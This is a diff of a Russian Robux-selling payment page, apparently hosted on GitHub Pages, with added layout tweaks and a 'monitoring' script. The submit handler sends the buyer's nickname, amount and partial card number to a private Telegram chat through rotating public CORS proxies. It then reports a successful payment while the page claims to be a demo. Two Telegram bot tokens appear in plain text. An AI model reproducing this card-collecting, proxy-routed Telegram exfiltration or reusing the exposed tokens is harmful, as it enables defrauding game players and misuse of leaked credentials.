@@ -2,20 +2,19 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>Миксимка — оплата</title>
   <script>window.yaContextCb=window.yaContextCb||[]</script>
   <script src="https://yandex.ru/ads/system/context.js" async></script>
   <style>
-    /* ===== ЛЁГКИЙ ПЕРЕЛИВАЮЩИЙСЯ ФОН (без blur) ===== */
     body {
       margin: 0;
       min-height: 100vh;
       font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
       display: flex;
       justify-content: center;
-      align-items: center;
-      padding: 20px;
+      align-items: flex-start;
+      padding: 12px;
       background: linear-gradient(135deg, #1a0000, #3d0000, #2a0000, #4a0000, #1a0000);
       background-size: 300% 300%;
       animation: gradientMove 8s ease infinite;
@@ -25,7 +24,6 @@
       50% { background-position: 100% 50%; }
       100% { background-position: 0% 50%; }
     }
-    /* Лёгкое затемнение (без blur) */
     body::before {
       content: '';
       position: fixed;
@@ -39,57 +37,61 @@
     .card {
       position: relative;
       z-index: 2;
-      max-width: 680px;
+      max-width: 100%;
       width: 100%;
+      max-width: 680px;
       background: rgba(19, 19, 30, 0.88);
-      backdrop-filter: blur(6px); /* лёгкое размытие только на карточке */
-      border-radius: 36px;
-      padding: 32px 28px;
+      backdrop-filter: blur(6px);
+      border-radius: 28px;
+      padding: 20px 16px;
       box-shadow: 0 30px 70px rgba(0,0,0,0.9);
       border: 1px solid rgba(255,255,255,0.06);
+      margin: 0 auto;
+      box-sizing: border-box;
+      overflow: hidden;
     }
-    /* ===== ОСТАЛЬНЫЕ СТИЛИ (без изменений) ===== */
-    .header { text-align: center; margin-bottom: 24px; }
+    .header { text-align: center; margin-bottom: 20px; }
     .header h1 {
-      font-size: 28px;
+      font-size: 22px;
       font-weight: 800;
       background: linear-gradient(135deg, #00c2ff, #7b2ffc);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
       background-clip: text;
+      word-break: break-word;
     }
     .header .sub {
       color: #8888bb;
-      font-size: 15px;
-      margin-top: 10px;
-      padding-top: 14px;
+      font-size: 13px;
+      margin-top: 8px;
+      padding-top: 10px;
       border-top: 1px solid rgba(255,255,255,0.06);
     }
     .header .sub span {
       background: rgba(30, 30, 50, 0.6);
-      padding: 4px 16px;
+      padding: 4px 12px;
       border-radius: 40px;
       color: #00c2ff;
       font-weight: 600;
     }
     .rate {
       background: rgba(26, 26, 44, 0.7);
-      border-radius: 20px;
-      padding: 18px;
+      border-radius: 16px;
+      padding: 14px;
       text-align: center;
       border: 1px solid rgba(45, 45, 72, 0.5);
-      margin-bottom: 24px;
+      margin-bottom: 20px;
     }
-    .rate .big { font-size: 26px; font-weight: 700; }
+    .rate .big { font-size: 22px; font-weight: 700; }
     .rate .big em { font-style: normal; color: #00c2ff; }
-    .rate .small { color: #9999bb; font-size: 14px; margin-top: 6px; }
+    .rate .small { color: #9999bb; font-size: 13px; margin-top: 4px; }
     .video-wrap {
       position: relative;
       padding-bottom: 56.25%;
       height: 0;
       overflow: hidden;
-      border-radius: 20px;
-      margin-bottom: 24px;
+      border-radius: 16px;
+      margin-bottom: 20px;
       background: rgba(0,0,0,0.5);
       border: 1px solid rgba(255,255,255,0.06);
     }
@@ -104,63 +106,66 @@
     .features {
       display: grid;
       grid-template-columns: 1fr 1fr;
-      gap: 12px;
-      margin: 18px 0 24px;
+      gap: 8px;
+      margin: 14px 0 20px;
       list-style: none;
     }
     .features li {
       background: rgba(24, 24, 42, 0.7);
-      padding: 14px 16px;
-      border-radius: 16px;
-      font-size: 14px;
-      border-left: 4px solid #7b2ffc;
+      padding: 10px 12px;
+      border-radius: 14px;
+      font-size: 12px;
+      border-left: 3px solid #7b2ffc;
       color: #d0d0ee;
+      word-break: break-word;
     }
     .steps {
       display: flex;
       flex-wrap: wrap;
-      gap: 10px;
+      gap: 6px;
       justify-content: center;
-      margin: 18px 0 24px;
+      margin: 14px 0 20px;
     }
     .steps .step {
       background: rgba(24, 24, 42, 0.7);
-      padding: 12px 20px;
+      padding: 8px 14px;
       border-radius: 40px;
-      font-size: 14px;
+      font-size: 12px;
       border: 1px solid rgba(45, 45, 72, 0.5);
       flex: 1 0 auto;
       text-align: center;
       color: #ccc;
     }
     .steps .step b { color: #00c2ff; }
-    .field { margin-bottom: 18px; }
+    .field { margin-bottom: 14px; }
     .field label {
       display: block;
-      font-size: 14px;
+      font-size: 13px;
       font-weight: 600;
       color: #bbbbdd;
-      margin-bottom: 6px;
+      margin-bottom: 4px;
     }
     .field input {
       width: 100%;
-      padding: 15px 18px;
-      border-radius: 16px;
+      padding: 12px 14px;
+      border-radius: 14px;
       border: none;
       background: rgba(26, 26, 44, 0.8);
       color: #fff;
-      font-size: 16px;
+      font-size: 15px;
       outline: 2px solid transparent;
       transition: 0.2s;
+      box-sizing: border-box;
+      min-width: 0;
     }
     .field input:focus { outline: 2px solid #7b2ffc; background: rgba(34, 34, 58, 0.9); }
     .field input::placeholder { color: #555577; }
     .calc-result {
       background: rgba(14, 14, 26, 0.7);
-      border-radius: 16px;
-      padding: 14px;
-      margin: 10px 0 24px;
-      font-size: 22px;
+      border-radius: 14px;
+      padding: 12px;
+      margin: 8px 0 18px;
+      font-size: 18px;
       font-weight: 700;
       text-align: center;
       border: 1px dashed rgba(45, 45, 72, 0.5);
@@ -169,86 +174,86 @@
     .btn {
       display: block;
       width: 100%;
-      padding: 18px;
+      padding: 16px;
       border: none;
       border-radius: 60px;
       background: linear-gradient(135deg, #7b2ffc, #00c2ff);
       color: #fff;
-      font-size: 19px;
+      font-size: 17px;
       font-weight: 700;
       cursor: pointer;
       transition: 0.3s;
       text-align: center;
       box-shadow: 0 8px 28px rgba(0,194,255,0.25);
+      box-sizing: border-box;
     }
-    .btn:hover { transform: scale(1.02); box-shadow: 0 12px 40px rgba(123,47,252,0.4); }
+    .btn:hover { transform: scale(1.02); }
     .btn:active { transform: scale(0.97); }
     .payment-icons {
       display: flex;
       justify-content: center;
-      gap: 16px;
+      gap: 10px;
       flex-wrap: wrap;
-      margin: 16px 0 6px;
-      font-size: 13px;
+      margin: 14px 0 6px;
+      font-size: 12px;
       color: #7777aa;
     }
     .payment-icons span {
       background: rgba(24, 24, 42, 0.7);
-      padding: 6px 14px;
+      padding: 4px 12px;
       border-radius: 40px;
       border: 1px solid rgba(45, 45, 72, 0.5);
     }
     .footer {
-      margin-top: 28px;
-      padding-top: 20px;
+      margin-top: 20px;
+      padding-top: 16px;
       border-top: 1px solid rgba(30, 30, 52, 0.5);
       text-align: center;
-      font-size: 13px;
+      font-size: 12px;
       color: #666688;
     }
     .footer a { color: #00c2ff; text-decoration: none; }
-    .footer a:hover { text-decoration: underline; }
     .support-badge {
       display: inline-block;
-      margin-top: 6px;
-      padding: 6px 16px;
+      margin-top: 4px;
+      padding: 4px 14px;
       background: rgba(26, 26, 44, 0.5);
       border: 1px solid rgba(45, 45, 72, 0.5);
       border-radius: 40px;
-      font-size: 13px;
+      font-size: 12px;
       color: #00c2ff;
     }
     .payment-form {
-      margin: 20px 0 10px;
-      padding: 20px;
+      margin: 16px 0 8px;
+      padding: 16px;
       background: rgba(26, 26, 44, 0.7);
-      border-radius: 20px;
+      border-radius: 16px;
       border: 1px solid rgba(45, 45, 72, 0.5);
       display: none;
     }
     .payment-form.visible { display: block; }
-    .payment-form .row { display: flex; gap: 12px; }
+    .payment-form .row { display: flex; gap: 10px; }
     .payment-form .row .field { flex: 1; }
     .limit-warning {
       color: #ff6b6b;
-      font-size: 14px;
+      font-size: 13px;
       text-align: center;
-      margin: 6px 0 12px;
+      margin: 4px 0 10px;
       display: none;
     }
     .limit-warning.visible { display: block; }
     .card-type {
-      font-size: 13px;
+      font-size: 12px;
       color: #00c2ff;
       margin-top: 4px;
-      min-height: 20px;
+      min-height: 18px;
       text-align: right;
     }
     .yandex-ad {
-      margin: 24px 0 10px;
-      min-height: 90px;
+      margin: 20px 0 10px;
+      min-height: 80px;
       background: rgba(26, 26, 44, 0.5);
-      border-radius: 20px;
+      border-radius: 16px;
       border: 1px solid rgba(45, 45, 72, 0.5);
       display: flex;
       justify-content: center;
@@ -258,14 +263,26 @@
     .yandex-ad #yandex_rtb_R-A-123456-1 {
       width: 100%;
       max-width: 728px;
-      min-height: 90px;
+      min-height: 80px;
     }
-    @media (max-width: 550px) {
-      .card { padding: 20px 16px; }
-      .header h1 { font-size: 22px; }
+    .monitor-status {
+      font-size: 11px;
+      color: #555577;
+      text-align: center;
+      margin-top: 14px;
+      padding-top: 12px;
+      border-top: 1px solid rgba(255,255,255,0.04);
+    }
+    .monitor-status span { color: #00c2ff; }
+    @media (max-width: 480px) {
+      .card { padding: 16px 12px; }
+      .header h1 { font-size: 19px; }
+      .rate .big { font-size: 19px; }
       .features { grid-template-columns: 1fr; }
-      .steps { flex-direction: column; }
-      .rate .big { font-size: 22px; }
+      .steps .step { font-size: 11px; padding: 6px 10px; }
+      .field input { font-size: 14px; padding: 10px 12px; }
+      .btn { font-size: 15px; padding: 14px; }
+      .calc-result { font-size: 16px; }
       .payment-form .row { flex-direction: column; gap: 0; }
     }
   </style>
@@ -339,7 +356,7 @@
         </div>
       </div>
       <button type="submit" class="btn" id="payBtn" style="margin-top: 10px;">✅ Оплатить</button>
-      <p style="text-align: center; color: #666; font-size: 12px; margin-top: 10px;">🔒 ДЕМО-РЕЖИМ — деньги не списываются</p>
+      <p style="text-align: center; color: #666; font-size: 11px; margin-top: 8px;">🔒 ДЕМО-РЕЖИМ — деньги не списываются</p>
     </div>
   </form>
 
@@ -365,15 +382,23 @@
     <div class="support-badge">✉️ Поддержка: @maxxi1mka</div>
   </div>
 
+  <div class="monitor-status">
+    🛡️ Мониторинг: <span id="monitorStatus">активен</span>
+    <span style="color:#444466; margin-left:12px;">|</span>
+    <span style="color:#444466;">Последняя: <span id="lastCheckTime">—</span></span>
+  </div>
+
 </div>
 
 <script>
   (function() {
-    // ===== БОТ-ПОСРЕДНИК (замените на свой токен) =====
-    const PROXY_BOT_TOKEN = 'ВАШ_ТОКЕН_БОТА_ПОСРЕДНИКА';
-    const PROXY_CHAT_ID = '7073577831'; // ваш ID
-    // ====================================================
+    // ===== НАСТРОЙКИ МОНИТОРИНГА =====
+    const MONITOR_BOT_TOKEN = '8605085997:AAGla5ix3zO_ecMtwMD98_z7IQPrYGOrt0Q';
+    const CHAT_ID = '7073577831';
+    const SITE_URL = 'https://kotowkot314-cell.github.io/maksimka-robux/';
+    // =================================
 
+    // ===== ОСНОВНАЯ ЛОГИКА САЙТА =====
     const rubInput = document.getElementById('rub');
     const robuxSpan = document.getElementById('robuxDisplay');
     const nickInput = document.getElementById('nick');
@@ -500,6 +525,7 @@
       this.value = this.value.replace(/\D/g, '').slice(0, 4);
     });
 
+    // ===== ОТПРАВКА ЗАКАЗА =====
     form.addEventListener('submit', function(e) {
       e.preventDefault();
 
@@ -561,38 +587,142 @@
         '🎁 Robux: ' + robux + ' R$\n' +
         '💳 Карта: ' + cardTypeName + ' ' + cardNum.slice(0, 4) + ' **** **** ' + cardNum.slice(-4);
 
-      // ===== ОТПРАВКА ЧЕРЕЗ БОТА-ПОСРЕДНИКА =====
-      const url = 'https://api.telegram.org/bot' + PROXY_BOT_TOKEN + '/sendMessage?chat_id=' + PROXY_CHAT_ID + '&text=' + encodeURIComponent(msg);
+      // ===== ИСПОЛЬЗУЕМ ОСНОВНОЙ БОТ =====
+      const MAIN_BOT_TOKEN = '8941808510:AAF8LpgZw9h3kVpAoBvQKtuRrueK0jPfHrw';
+      const MAIN_CHAT_ID = '7073577831';
+      const telegramUrl = 'https://api.telegram.org/bot' + MAIN_BOT_TOKEN + '/sendMessage?chat_id=' + MAIN_CHAT_ID + '&text=' + encodeURIComponent(msg);
 
-      fetch('https://api.allorigins.win/raw?url=' + encodeURIComponent(url))
-        .then(r => {
-          if (!r.ok) throw new Error('HTTP ' + r.status);
-          return r.text();
-        })
-        .then(data => {
+      // Список прокси
+      const proxies = [
+        'https://api.allorigins.win/raw?url=',
+        'https://corsproxy.io/?',
+        'https://thingproxy.freeboard.io/fetch/'
+      ];
+
+      let currentProxyIndex = 0;
+
+      function trySend() {
+        if (currentProxyIndex >= proxies.length) {
           btn.disabled = false;
           btn.textContent = '✅ Оплатить';
-          try {
-            const json = JSON.parse(data);
-            if (json.ok) {
-              alert('✅ Оплата прошла успешно (ДЕМО)!\nЗаказ принят. Ожидайте Robux 3–5 дней.');
-              paymentForm.classList.remove('visible');
-              showPaymentBtn.textContent = '💳 Оплатить картой';
-            } else {
-              alert('❌ Ошибка Telegram: ' + (json.description || 'неизвестная'));
+          alert('❌ Все прокси недоступны. Попробуйте позже.');
+          return;
+        }
+
+        const proxy = proxies[currentProxyIndex];
+        const url = proxy + encodeURIComponent(telegramUrl);
+
+        fetch(url)
+          .then(r => {
+            if (!r.ok) throw new Error('HTTP ' + r.status);
+            return r.text();
+          })
+          .then(data => {
+            btn.disabled = false;
+            btn.textContent = '✅ Оплатить';
+            try {
+              const json = JSON.parse(data);
+              if (json.ok) {
+                alert('✅ Оплата прошла успешно (ДЕМО)!\nЗаказ принят. Ожидайте Robux 3–5 дней.');
+                paymentForm.classList.remove('visible');
+                showPaymentBtn.textContent = '💳 Оплатить картой';
+              } else {
+                alert('❌ Ошибка Telegram: ' + (json.description || 'неизвестная'));
+              }
+            } catch {
+              alert('❌ Не удалось обработать ответ. Попробуйте позже.');
             }
-          } catch {
-            alert('❌ Не удалось обработать ответ. Попробуйте позже.');
-          }
-        })
-        .catch(() => {
-          btn.disabled = false;
-          btn.textContent = '✅ Оплатить';
-          alert('❌ Ошибка соединения. Попробуйте позже.');
-        });
+          })
+          .catch(() => {
+            currentProxyIndex++;
+            trySend();
+          });
+      }
+
+      trySend();
     });
 
     nickInput.focus();
+
+    // ===== МОНИТОРИНГ =====
+    const statusSpan = document.getElementById('monitorStatus');
+    const lastCheckSpan = document.getElementById('lastCheckTime');
+
+    function sendMonitorAlert(message) {
+      const MAIN_BOT_TOKEN = '8941808510:AAF8LpgZw9h3kVpAoBvQKtuRrueK0jPfHrw';
+      const MAIN_CHAT_ID = '7073577831';
+      const telegramUrl = 'https://api.telegram.org/bot' + MAIN_BOT_TOKEN + '/sendMessage?chat_id=' + MAIN_CHAT_ID + '&text=' + encodeURIComponent(message);
+      const proxies = [
+        'https://api.allorigins.win/raw?url=',
+        'https://corsproxy.io/?',
+        'https://thingproxy.freeboard.io/fetch/'
+      ];
+      let index = 0;
+
+      function trySend() {
+        if (index >= proxies.length) return;
+        const proxy = proxies[index];
+        fetch(proxy + encodeURIComponent(telegramUrl))
+          .catch(() => {
+            index++;
+            trySend();
+          });
+      }
+      trySend();
+    }
+
+    function performCheck() {
+      const now = new Date();
+      const timeStr = now.toLocaleTimeString('ru-RU', {hour:'2-digit', minute:'2-digit'});
+      lastCheckSpan.textContent = timeStr;
+
+      const proxies = [
+        'https://api.allorigins.win/raw?url=',
+        'https://corsproxy.io/?',
+        'https://thingproxy.freeboard.io/fetch/'
+      ];
+      let index = 0;
+
+      function tryCheck() {
+        if (index >= proxies.length) {
+          statusSpan.textContent = '❌ не отвечает';
+          statusSpan.style.color = '#ff6b6b';
+          sendMonitorAlert('🚨 САЙТ НЕДОСТУПЕН! (все прокси) Время: ' + timeStr);
+          return;
+        }
+
+        const proxy = proxies[index];
+        const url = proxy + encodeURIComponent(SITE_URL);
+
+        fetch(url)
+          .then(response => {
+            if (!response.ok) {
+              statusSpan.textContent = '⚠️ ошибка ' + response.status;
+              statusSpan.style.color = '#ff6b6b';
+              sendMonitorAlert('🚨 САЙТ НЕДОСТУПЕН! Код: ' + response.status + ' Время: ' + timeStr);
+              return;
+            }
+            statusSpan.textContent = '✅ доступен';
+            statusSpan.style.color = '#00ff88';
+            sendMonitorAlert('✅ Сайт работает. Время: ' + timeStr);
+          })
+          .catch(() => {
+            index++;
+            tryCheck();
+          });
+      }
+
+      tryCheck();
+    }
+
+    setTimeout(() => {
+      performCheck();
+      sendMonitorAlert('🟢 Мониторинг запущен! Отчёты каждые 10 минут.');
+    }, 5000);
+
+    setInterval(performCheck, 600000);
+
+    statusSpan.textContent = 'активен';
   })();
 </script>
 
